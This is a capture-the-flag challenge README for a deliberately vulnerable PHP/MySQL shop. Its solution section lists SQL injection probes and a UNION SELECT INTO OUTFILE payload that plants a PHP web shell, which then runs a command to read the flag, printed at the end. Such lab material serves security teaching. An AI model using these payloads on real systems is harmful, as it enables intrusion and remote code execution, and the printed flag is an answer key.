# CTF Challenge: SQL Injection to RCE

**Category:** Web Exploitation  
**Difficulty:** Medium-Hard  
**Author:** Securinets  

## Description

> Welcome to the Securinets Tech Shop! We sell the best gear for hackers.  
> Our developer said the site is "secure enough"... Can you prove them wrong?

**Objective:** Find the flag at `/flag.txt`

## Deployment

```bash
docker-compose up --build -d
# Wait 30 seconds for MySQL to initialize
```

**URL:** http://localhost:8080

## Vulnerability Chain

1. **SQL Injection** in product ID parameter
2. **INTO OUTFILE** to write PHP shell to shared volume
3. **RCE** via the uploaded PHP shell
4. **Read flag** from /flag.txt

## Solution

```bash
# Wait for services to be ready, then:
python3 solver/solve.py http://localhost:8080
```

### Manual Exploitation

**Step 1:** Detect SQLi
```
?id=1 AND 1=1   (works)
?id=1 AND 1=2   (no results)
```

**Step 2:** Find column count
```
?id=1 ORDER BY 3--   (works)
?id=1 ORDER BY 4--   (error)
```

**Step 3:** Write shell
```
?id=1 UNION SELECT "<?php system($_GET['c']); ?>",2,3 INTO OUTFILE "/var/lib/mysql-files/shell.php"
```

**Step 4:** Access shell & get flag
```
/images/shell.php?c=cat /flag.txt
```

## Flag
`Securinets{UNION_SELECT_INTO_OUTFILE_1S_4W3S0M3}`
